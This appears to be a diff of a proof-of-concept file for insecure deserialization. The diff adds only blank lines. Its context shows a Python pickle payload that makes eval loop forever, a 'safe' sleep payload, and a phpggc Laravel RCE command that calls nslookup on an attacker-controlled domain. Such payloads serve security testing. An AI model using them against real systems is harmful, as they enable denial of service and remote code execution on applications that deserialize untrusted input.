@@ -114,9 +114,11 @@ c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b,*b,*b,*b,*b,*b,*b,*b]
 # Python pickle DoS — infinite loop (safe-ish: CPU only, no side effects)
 import pickle, base64
 
+
 class DoSPoC(object):
     def __reduce__(self):
         return (eval, ("[x for x in iter(int, 1)]",))  # Infinite list comprehension
+
 
 payload = base64.b64encode(pickle.dumps(DoSPoC())).decode()
 print(payload)
@@ -173,9 +175,11 @@ phpggc Laravel/RCE1 system 'nslookup attacker-controlled-domain.com'
 # Safe: sleep() to demonstrate code execution
 import pickle, base64, os, time
 
+
 class SafePoC(object):
     def __reduce__(self):
         return (time.sleep, (3,))
+
 
 payload = base64.b64encode(pickle.dumps(SafePoC())).decode()
 print(payload)
